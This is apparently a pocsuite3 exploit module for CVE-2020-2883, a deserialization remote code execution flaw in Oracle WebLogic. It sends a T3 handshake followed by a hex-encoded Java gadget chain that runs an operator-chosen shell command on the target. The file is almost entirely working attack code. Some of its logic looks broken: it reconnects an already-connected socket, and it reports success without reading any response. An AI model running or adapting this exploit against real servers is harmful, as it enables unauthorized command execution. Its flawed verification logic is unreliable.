# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, logger, OptString
import socket
import ssl
import time
import binascii
from urllib.parse import urlparse

class CVE_2020_2883_PoC(POCBase):
    vulID = 'CVE-2020-2883'
    version = '1.0'
    author = ['Your Name']
    vulDate = '2020-10-20'
    createDate = '2023-07-24'
    updateDate = '2023-07-24'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2020-2883']
    name = 'CVE-2020-2883 Weblogic RCE'
    appPowerLink = 'https://www.oracle.com/middleware/technologies/weblogic.html'
    appName = 'Oracle Weblogic'
    appVersion = '10.3.6.0, 12.1.3.0'
    vulType = 'Remote Code Execution'
    desc = 'This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Oracle Weblogic.'
    
    def _options(self):
        o = {
            "command": OptString("id", description="Command to execute on the target system")
        }
        return o

    def _verify(self):
        result = {}
        url = self.url
        command = self.get_option('command')
        proto, ip, port, uri = self.parseUrl(url)
        
        payload = self.CVE_2020_2883_payload(command)
        
        try:
            with socket.create_connection((ip, int(port)), timeout=10) as s:
                wrappedSocket = ssl.wrap_socket(s) if proto == 'https' else s
                self.t3handshake(wrappedSocket, (ip, int(port)))
                self.buildT3RequestObject(wrappedSocket, port)
                wrappedSocket.send(binascii.unhexlify(payload))
                time.sleep(2)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Command'] = command
                return self.parse_output(result)
        except Exception as e:
            logger.error(f"Verification failed: {e}")
            return self.parse_output(result)

    def parseUrl(self, url):
        parsed = urlparse(url)
        proto = parsed.scheme
        netloc = parsed.netloc.split(':')
        ip = netloc[0]
        port = int(netloc[1]) if len(netloc) > 1 else (443 if proto == 'https' else 80)
        return proto, ip, port, parsed.path

    def CVE_2020_2883_payload(self, cmd):
        payload_start = 'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374466f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174'
        payload_lenhex = '{:04x}'.format(len(cmd))
        payload_cmdhex = binascii.hexlify(cmd.encode()).decode()
        payload_end = '74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178'
        payload = payload_start + payload_lenhex + payload_cmdhex + payload_end
        return payload

    def t3handshake(self, sock, server_addr):
        sock.connect(server_addr)
        sock.send(binascii.unhexlify('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
        time.sleep(1)
        data = sock.recv(1024)
        logger.info("Handshake successful")

    def buildT3RequestObject(self, sock, port):
        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00064c000e72656c6561736556657273696f6e71007e00035b001276657273696f6e496e666f4173427974657371007e0005787075020001787072'
        payload = binascii.unhexlify(data1)
        sock.send(payload)
        time.sleep(2)

    def parse_output(self, result):
        if result:
            output = Output(self)
            output.success(result)
        else:
            output = Output(self)
            output.fail('No response from target')
        return output

register_poc(CVE_2020_2883_PoC)

